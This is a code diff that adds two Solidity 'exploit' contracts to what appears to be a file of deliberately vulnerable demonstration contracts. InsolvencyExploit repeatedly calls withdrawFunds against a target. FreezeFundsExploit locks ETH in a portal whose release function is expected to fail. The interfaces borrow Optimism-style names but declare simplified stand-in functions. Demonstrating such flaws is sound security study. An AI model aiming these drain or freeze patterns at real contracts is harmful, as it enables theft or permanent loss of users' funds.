@@ -98,6 +98,49 @@ contract VulnerableL1StandardBridge {
 }
 
 /**
+ * @title InsolvencyExploit
+ * @notice Contract that demonstrates the protocol insolvency vulnerability
+ */
+contract InsolvencyExploit {
+    address public target;
+    
+    constructor(address _target) {
+        target = _target;
+    }
+    
+    function attack() external {
+        // Repeatedly withdraws funds without proper balance validation
+        for (uint256 i = 0; i < 10; i++) {
+            IL2ToL1MessagePasser(target).withdrawFunds(100 ether);
+        }
+    }
+}
+
+/**
+ * @title FreezeFundsExploit
+ * @notice Contract that demonstrates the permanent freezing of funds vulnerability
+ */
+contract FreezeFundsExploit {
+    address public target;
+    
+    constructor(address _target) {
+        target = _target;
+    }
+    
+    function attack() external payable {
+        // Lock funds in the contract - there's no recovery mechanism
+        IOptimismPortal(target).lockFunds{value: msg.value}();
+        
+        // Try to release the funds (will fail)
+        try IOptimismPortal(target).releaseFunds() {
+            // This should always fail due to a bug in the portal contract
+        } catch {
+            // Expected behavior - funds are now permanently locked
+        }
+    }
+}
+
+/**
  * @title SimpleBank
  * @notice A simple bank contract that will be targeted by an exploit
  */
@@ -129,4 +172,13 @@ contract SimpleBank {
 interface IL1CrossDomainMessenger {
     function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) external;
     function xDomainMessageSender() external view returns (address);
+}
+
+interface IL2ToL1MessagePasser {
+    function withdrawFunds(uint256 amount) external;
+}
+
+interface IOptimismPortal {
+    function lockFunds() external payable;
+    function releaseFunds() external;
 }
